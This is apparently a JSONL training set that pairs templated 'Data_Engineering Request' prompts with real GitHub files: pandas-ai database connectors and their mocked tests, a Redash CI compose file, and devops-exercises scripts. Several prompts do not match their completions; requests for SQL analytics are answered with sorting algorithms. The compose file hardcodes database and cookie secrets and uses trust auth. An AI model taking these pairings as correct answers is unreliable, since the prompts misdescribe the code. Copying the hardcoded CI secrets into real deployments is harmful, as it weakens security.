{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nimport pandas as pd\n\n# Assuming the functions are in a module called db_loader\nfrom pandasai_sql import (\n    load_from_cockroachdb,\n    load_from_mysql,\n    load_from_postgres,\n)\n\nfrom pandasai.data_loader.semantic_layer_schema import SQLConnectionConfig\n\n\nclass TestDatabaseLoader(unittest.TestCase):\n    @patch(\"pymysql.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_mysql(self, mock_read_sql, mock_pymysql_connect):\n        # Setup the mock return values\n        mock_conn = MagicMock()\n        mock_pymysql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [1, 2], \"column2\": [3, 4]}\n        )\n\n        # Test data\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 3306,\n        }\n\n        query = \"SELECT * FROM test_table\"\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_mysql(connection_config, query)\n\n        # Assert that the connection is made and SQL query is executed\n        mock_pymysql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            database=\"test_db\",\n            port=3306,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=None)\n\n        # Assert the result is a DataFrame\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_postgres(self, mock_read_sql, mock_psycopg2_connect):\n        # Setup the mock return values\n        mock_conn = MagicMock()\n        mock_psycopg2_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [5, 6], \"column2\": [7, 8]}\n        )\n\n        # Test data\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"postgres\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 5432,\n        }\n        query = \"SELECT * FROM test_table\"\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_postgres(connection_config, query)\n\n        # Assert that the connection is made and SQL query is executed\n        mock_psycopg2_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"postgres\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=5432,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=None)\n\n        # Assert the result is a DataFrame\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_cockroachdb(self, mock_read_sql, mock_postgresql_connect):\n        # Setup the mock return values\n        mock_conn = MagicMock()\n        mock_postgresql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [13, 14], \"column2\": [15, 16]}\n        )\n\n        # Test data\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 26257,\n        }\n        query = \"SELECT * FROM test_table\"\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_cockroachdb(connection_config, query)\n\n        # Assert that the connection is made and SQL query is executed\n        mock_postgresql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=26257,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=None)\n\n        # Assert the result is a DataFrame\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"pymysql.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_mysql_with_params(self, mock_read_sql, mock_pymysql_connect):\n        mock_conn = MagicMock()\n        mock_pymysql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [1, 2], \"column2\": [3, 4]}\n        )\n\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 3306,\n        }\n        query = \"SELECT * FROM test_table WHERE id = %s\"\n        query_params = [123]\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_mysql(connection_config, query, query_params)\n\n        mock_pymysql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            database=\"test_db\",\n            port=3306,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=query_params)\n\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_postgres_with_params(self, mock_read_sql, mock_psycopg2_connect):\n        mock_conn = MagicMock()\n        mock_psycopg2_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [5, 6], \"column2\": [7, 8]}\n        )\n\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"postgres\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 5432,\n        }\n        query = \"SELECT * FROM test_table WHERE name ILIKE %s\"\n        query_params = [\"%John%\"]\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_postgres(connection_config, query, query_params)\n\n        mock_psycopg2_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"postgres\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=5432,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=query_params)\n\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_cockroachdb_with_params(\n        self, mock_read_sql, mock_postgresql_connect\n    ):\n        mock_conn = MagicMock()\n        mock_postgresql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [13, 14], \"column2\": [15, 16]}\n        )\n\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 26257,\n        }\n        query = \"SELECT * FROM test_table WHERE status = %s\"\n        query_params = [\"active\"]\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_cockroachdb(connection_config, query, query_params)\n\n        mock_postgresql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=26257,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=query_params)\n\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/sql/tests/test_sql.py", "language": "python", "complexity": "complex", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "def load_from_yahoo_finance(connection_info, query):\n    import yfinance as yf\n\n    ticker = yf.Ticker(connection_info[\"ticker\"])\n    data = ticker.history(period=connection_info.get(\"period\", \"1mo\"))\n\n    return data.to_csv(index=True)\n\n\n__all__ = [\"load_from_yahoo_finance\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/yfinance/pandasai_yfinance/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nimport pandas as pd\n\n# Assuming the functions are in a module called yahoo_finance\nfrom pandasai_yfinance import load_from_yahoo_finance\n\n\nclass TestYahooFinanceLoader(unittest.TestCase):\n    @patch(\"yfinance.Ticker\")\n    def test_load_from_yahoo_finance(self, MockTicker):\n        # Setup the mock return value for history method\n        mock_ticker_instance = MagicMock()\n        MockTicker.return_value = mock_ticker_instance\n        mock_ticker_instance.history.return_value = pd.DataFrame(\n            {\n                \"Date\": [\"2025-01-01\", \"2025-01-02\"],\n                \"Open\": [150, 152],\n                \"High\": [155, 157],\n                \"Low\": [148, 150],\n                \"Close\": [153, 155],\n                \"Volume\": [100000, 120000],\n            },\n            index=pd.to_datetime([\"2025-01-01\", \"2025-01-02\"]),\n        )\n\n        # Test data\n        connection_info = {\"ticker\": \"AAPL\", \"period\": \"1d\"}\n        query = (\n            \"\"\n        )  # Since the query parameter is not used, we can leave it as an empty string\n\n        # Call the function under test\n        result = load_from_yahoo_finance(connection_info, query)\n\n        # Assert that the Ticker method was called with the correct ticker symbol\n        MockTicker.assert_called_once_with(\"AAPL\")\n\n        # Assert that the history method was called with the correct period\n        mock_ticker_instance.history.assert_called_once_with(period=\"1d\")\n\n        print(result)\n\n        # Assert the result is a CSV string\n        self.assertTrue(result.startswith(\",Date,Open,High,Low,Close,Volume\"))\n        self.assertIn(\"2025-01-01\", result)\n        self.assertIn(\"2025-01-02\", result)\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/yfinance/tests/test_yahoo_finance.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import pandas as pd\nfrom google.cloud import bigquery\n\n\ndef load_from_bigquery(connection_info, query):\n    client = bigquery.Client(\n        project=connection_info[\"project_id\"],\n        credentials=connection_info.get(\"credentials\"),\n    )\n\n    query_job = client.query(query)\n    return pd.DataFrame(query_job.result())\n\n\n__all__ = [\"load_from_bigquery\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/bigquery/pandasai_bigquery/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from unittest.mock import MagicMock, patch\n\nimport pandas as pd\nimport pytest\nfrom pandasai_bigquery import load_from_bigquery\n\n\n@pytest.fixture\ndef mock_connection_info():\n    return {\n        \"project_id\": \"test-project\",\n        \"credentials\": None,\n    }\n\n\n@pytest.fixture\ndef mock_query_result():\n    # Mock query result with sample data\n    return [\n        {\"column1\": \"value1\", \"column2\": 123},\n        {\"column1\": \"value2\", \"column2\": 456},\n    ]\n\n\ndef test_load_from_bigquery_success(mock_connection_info, mock_query_result):\n    query = \"SELECT * FROM test_table\"\n\n    # Mock the BigQuery client and query job\n    with patch(\"google.cloud.bigquery.Client\") as MockBigQueryClient:\n        mock_client = MagicMock()\n        MockBigQueryClient.return_value = mock_client\n\n        mock_query_job = MagicMock()\n        mock_client.query.return_value = mock_query_job\n\n        mock_query_job.result.return_value = [\n            MagicMock(**row) for row in mock_query_result\n        ]\n\n        # Mock converting query results to DataFrame\n        mock_dataframe = pd.DataFrame(mock_query_result)\n        with patch(\"pandas.DataFrame\", return_value=mock_dataframe):\n            result = load_from_bigquery(mock_connection_info, query)\n\n            # Assertions\n            mock_client.query.assert_called_once_with(query)\n            assert isinstance(result, type(mock_dataframe))\n            assert result.equals(mock_dataframe)\n\n\ndef test_load_from_bigquery_failure(mock_connection_info):\n    query = \"SELECT * FROM non_existent_table\"\n\n    # Mock the BigQuery client and query job\n    with patch(\"google.cloud.bigquery.Client\") as MockBigQueryClient:\n        mock_client = MagicMock()\n        MockBigQueryClient.return_value = mock_client\n\n        mock_query_job = MagicMock()\n        mock_client.query.return_value = mock_query_job\n\n        # Simulate an exception during query execution\n        mock_query_job.result.side_effect = Exception(\"Query failed\")\n\n        with pytest.raises(Exception, match=\"Query failed\"):\n            load_from_bigquery(mock_connection_info, query)\n\n        # Assertions\n        mock_client.query.assert_called_once_with(query)\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/bigquery/tests/test_bigquery.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import pandas as pd\nfrom databricks import sql\n\n\ndef load_from_databricks(config):\n    \"\"\"\n    Load data from Databricks SQL into a pandas DataFrame.\n\n    Args:\n        config (dict): Configuration dictionary containing:\n            - host: Databricks server hostname\n            - http_path: HTTP path for the SQL warehouse\n            - token: Access token for authentication\n            - database: (optional) Database name\n            - table: (optional) Table name\n            - query: (optional) Custom SQL query\n\n    Returns:\n        pd.DataFrame: DataFrame containing the query results\n    \"\"\"\n    connection = sql.connect(\n        server_hostname=config[\"host\"],\n        http_path=config[\"http_path\"],\n        access_token=config[\"token\"],\n    )\n\n    cursor = connection.cursor()\n\n    try:\n        if \"query\" in config:\n            query = config[\"query\"]\n        elif \"table\" in config:\n            query = f\"SELECT * FROM {config['database']}.{config['table']}\"\n        else:\n            raise ValueError(\"Either 'query' or 'table' must be provided in config\")\n\n        cursor.execute(query)\n        result = cursor.fetchall()\n\n        if not result:\n            return pd.DataFrame()\n\n        columns = [desc[0] for desc in cursor.description]\n        return pd.DataFrame(result, columns=columns)\n    finally:\n        cursor.close()\n        connection.close()\n\n\n__all__ = [\"load_from_databricks\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/databricks/pandasai_databricks/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nfrom pandasai_databricks import (\n    load_from_databricks,\n)\n\n\nclass TestDatabricksLoader(unittest.TestCase):\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_with_query(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Sample data that would be returned by Databricks SQL\n        mock_cursor.fetchall.return_value = [\n            (1, \"Alice\", 100),\n            (2, \"Bob\", 200),\n        ]\n        mock_cursor.description = [(\"id\",), (\"name\",), (\"value\",)]\n\n        # Test config with a custom SQL query\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n            \"query\": \"SELECT * FROM sample_table\",\n        }\n\n        # Call the function under test\n        result = load_from_databricks(config)\n\n        # Assertions\n        MockConnect.assert_called_once_with(\n            server_hostname=\"databricks_host\",\n            http_path=\"http_path\",\n            access_token=\"access_token\",\n        )\n        mock_cursor.execute.assert_called_once_with(\"SELECT * FROM sample_table\")\n        self.assertEqual(result.shape[0], 2)  # 2 rows\n        self.assertEqual(result.shape[1], 3)  # 3 columns\n        self.assertTrue(\"id\" in result.columns)\n        self.assertTrue(\"name\" in result.columns)\n        self.assertTrue(\"value\" in result.columns)\n\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_with_table(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Sample data returned by Databricks SQL\n        mock_cursor.fetchall.return_value = [\n            (1, \"Alice\", 100),\n            (2, \"Bob\", 200),\n        ]\n        mock_cursor.description = [(\"id\",), (\"name\",), (\"value\",)]\n\n        # Test config with a table name\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n            \"database\": \"test_db\",\n            \"table\": \"sample_table\",\n        }\n\n        # Call the function under test\n        result = load_from_databricks(config)\n\n        # Assertions\n        query = \"SELECT * FROM test_db.sample_table\"\n        mock_cursor.execute.assert_called_once_with(query)\n        self.assertEqual(result.shape[0], 2)\n        self.assertEqual(result.shape[1], 3)\n        self.assertTrue(\"id\" in result.columns)\n        self.assertTrue(\"name\" in result.columns)\n        self.assertTrue(\"value\" in result.columns)\n\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_no_query_or_table(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Test config with neither query nor table\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n        }\n\n        # Call the function under test and assert that it raises a ValueError\n        with self.assertRaises(ValueError):\n            load_from_databricks(config)\n\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_empty_result(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Empty result set\n        mock_cursor.fetchall.return_value = []\n        mock_cursor.description = [(\"id\",), (\"name\",), (\"value\",)]\n\n        # Test config with a custom SQL query\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n            \"query\": \"SELECT * FROM sample_table\",\n        }\n\n        # Call the function under test\n        result = load_from_databricks(config)\n\n        # Assertions\n        self.assertTrue(result.empty)  # Result should be an empty DataFrame\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/databricks/tests/test_databricks.py", "language": "python", "complexity": "medium", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import cx_Oracle\nimport pandas as pd\n\n\ndef load_from_oracle(connection_info, query):\n    dsn = cx_Oracle.makedsn(\n        connection_info[\"host\"],\n        connection_info[\"port\"],\n        service_name=connection_info.get(\"service_name\"),\n        sid=connection_info.get(\"sid\"),\n    )\n    conn = cx_Oracle.connect(\n        user=connection_info[\"user\"], password=connection_info[\"password\"], dsn=dsn\n    )\n    return pd.read_sql(query, conn)\n\n\n__all__ = [\"load_from_oracle\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/oracle/pandasai_oracle/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "services:\n  redash:\n    build: ../\n    command: manage version\n    depends_on:\n      - postgres\n      - redis\n    ports:\n      - \"5000:5000\"\n    environment:\n      PYTHONUNBUFFERED: 0\n      REDASH_LOG_LEVEL: \"INFO\"\n      REDASH_REDIS_URL: \"redis://redis:6379/0\"\n      POSTGRES_PASSWORD: \"FmTKs5vX52ufKR1rd8tn4MoSP7zvCJwb\"\n      REDASH_DATABASE_URL: \"postgresql://postgres:FmTKs5vX52ufKR1rd8tn4MoSP7zvCJwb@postgres/postgres\"\n      REDASH_COOKIE_SECRET: \"2H9gNG9obnAQ9qnR9BDTQUph6CbXKCzF\"\n  redis:\n    image: redis:7-alpine\n    restart: unless-stopped\n  postgres:\n    image: pgautoupgrade/pgautoupgrade:latest\n    command: \"postgres -c fsync=off -c full_page_writes=off -c synchronous_commit=OFF\"\n    restart: unless-stopped\n    environment:\n      POSTGRES_HOST_AUTH_METHOD: \"trust\"\n", "metadata": {"source": "github.com/getredash/redash", "file_path": ".ci/compose.ci.yaml", "language": "yaml", "complexity": "simple", "star_count": 27596, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\nimport random\nfrom typing import List, Optional\n\n\ndef binary_search(arr: List[int], lb: int, ub: int, target: int) -> Optional[int]:\n    \"\"\"\n    A Binary Search Example which has O(log n) time complexity.\n    \"\"\"\n    while lb <= ub:\n        mid = lb + (ub - lb) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            lb = mid + 1\n        else:\n            ub = mid - 1\n    return -1\n\n\ndef generate_random_list(size: int = 10, lower: int = 1, upper: int = 50) -> List[int]:\n    return sorted(random.randint(lower, upper) for _ in range(size))\n\n\ndef find_target_in_list(target: int, lst: List[int]) -> int:\n    return binary_search(lst, 0, len(lst) - 1, target)\n\n\ndef main():\n    \"\"\"\n    Executes the binary search algorithm with a randomly generated list.\n    Time Complexity: O(log n)\n    \"\"\"\n    rand_num_li = generate_random_list()\n    target = random.randint(1, 50)\n    index = find_target_in_list(target, rand_num_li)\n    print(f\"List: {rand_num_li}\\nTarget: {target}\\nIndex: {index}\")\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "coding/python/binary_search.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\nimport random\nfrom typing import List\n\n\ndef merge_sort(arr: List[int]) -> List[int]:\n    if len(arr) <= 1:\n        return arr\n    mid = len(arr) // 2\n    left = merge_sort(arr[:mid])\n    right = merge_sort(arr[mid:])\n    return merge(left, right)\n\n\ndef merge(left: List[int], right: List[int]) -> List[int]:\n    merged = []\n    i = j = 0\n    while i < len(left) and j < len(right):\n        if left[i] <= right[j]:\n            merged.append(left[i])\n            i += 1\n        else:\n            merged.append(right[j])\n            j += 1\n    merged.extend(left[i:])\n    merged.extend(right[j:])\n    return merged\n\n\ndef generate_random_list(size: int = 10, lower: int = 1, upper: int = 100) -> List[int]:\n    return [random.randint(lower, upper) for _ in range(size)]\n\n\ndef main():\n    \"\"\"\n    Executes the merge sort algorithm with a randomly generated list.\n    Time Complexity: O(n log n)\n    \"\"\"\n    rand_num_li = generate_random_list()\n    print(f\"Unsorted List: {rand_num_li}\")\n    sorted_list = merge_sort(rand_num_li)\n    print(f\"Sorted List: {sorted_list}\")\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "coding/python/merge_sort.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import boto3\nimport json\n\n\ndef lambda_handler(event, context):\n    # i want to know that event thing\n    print(event)\n\n    # extract relevant information from the s3 event trigger\n    bucket_name = event['Records'][0]['s3']['bucket']['name']\n    object_key = event['Records'][0]['s3']['object']['key']\n\n    # perform desired operations with the uploaded file\n    print(f\"File '{object_key}' was uploaded to bucket '{bucket_name}'\")\n\n    # example: send a notification via SNS\n    sns_client = boto3.client('sns')\n    topic_arn = 'arn:aws:sns:us-east-1:<account-id>:s3-lambda-sns'\n    sns_client.publish(\n        TopicArn=topic_arn,\n        Subject='s3 object created !!',\n        Message=f\"File '{object_key}' was uploaded to bucket '{bucket_name}'\"\n    )\n\n    # Example: Trigger another Lambda function\n    # lambda_client = boto3.client('lambda')\n    # target_function_name = 'my-another-lambda-function'\n    # lambda_client.invoke(\n    #     FunctionName=target_function_name,\n    #     InvocationType='Event',\n    #     Payload=json.dumps({'bucket_name': bucket_name, 'object_key': object_key})\n    # )\n    # in case of queuing and other objectives similar to the Netflix flow of triggering\n\n    return {\n        'statusCode': 200,\n        'body': json.dumps(\"Lambda function executed successfully !!\")\n    }\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "scripts/aws s3 event triggering/s3-lambda/s3-lambda.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nQuestion utils functions\n\"\"\"\n\nimport pathlib\nfrom random import choice\nfrom typing import List\nimport re\n\nREADME_PATH = pathlib.Path(__file__).parent.parent / \"README.md\"\nEXERCISES_PATH = pathlib.Path(__file__).parent.parent / \"exercises\"\n\nDETAILS_PATTERN = re.compile(r\"<details>(.*?)</details>\", re.DOTALL)\nSUMMARY_PATTERN = re.compile(r\"<summary>(.*?)</summary>\", re.DOTALL)\nB_PATTERN = re.compile(r\"<b>(.*?)</b>\", re.DOTALL)\n\n\ndef get_file_content() -> str:\n    with README_PATH.open(\"r\", encoding=\"utf-8\") as f:\n        return f.read()\n\n\ndef get_question_list(file_content: str) -> List[str]:\n    details = DETAILS_PATTERN.findall(file_content)\n    return [\n        SUMMARY_PATTERN.search(detail).group(1)\n        for detail in details\n        if SUMMARY_PATTERN.search(detail)\n    ]\n\n\ndef get_answered_questions(file_content: str) -> List[str]:\n    details = DETAILS_PATTERN.findall(file_content)\n    answered = []\n    for detail in details:\n        summary_match = SUMMARY_PATTERN.search(detail)\n        b_match = B_PATTERN.search(detail)\n        if (\n                summary_match\n                and b_match\n                and summary_match.group(1).strip()\n                and b_match.group(1).strip()\n        ):\n            answered.append(summary_match.group(1))\n    return answered\n\n\ndef get_answers_count() -> List[int]:\n    file_content = get_file_content()\n    answered = get_answered_questions(file_content)\n    all_questions = get_question_list(file_content)\n    return [len(answered), len(all_questions)]\n\n\ndef get_challenges_count() -> int:\n    return len(list(EXERCISES_PATH.glob(\"*.md\")))\n\n\ndef get_random_question(question_list: List[str], with_answer: bool = False) -> str:\n    if with_answer:\n        return choice(get_answered_questions(get_file_content()))\n    return choice(get_question_list(get_file_content()))\n\n\n\"\"\"Use this question_list. Unless you have already opened/worked/need the file, then don't or\nyou will end up doing the same thing twice.\neg:\n# my_dir/main.py\nfrom scripts import question_utils\n\nprint(\n    question_utils.get_answered_questions(\n        question_utils.get_question_list(\n            question_utils.get_file_content()\n        )\n    )\n)\n>> 123\n\"\"\"\n\nif __name__ == \"__main__\":\n    import doctest\n\n    doctest.testmod()\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "scripts/question_utils.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
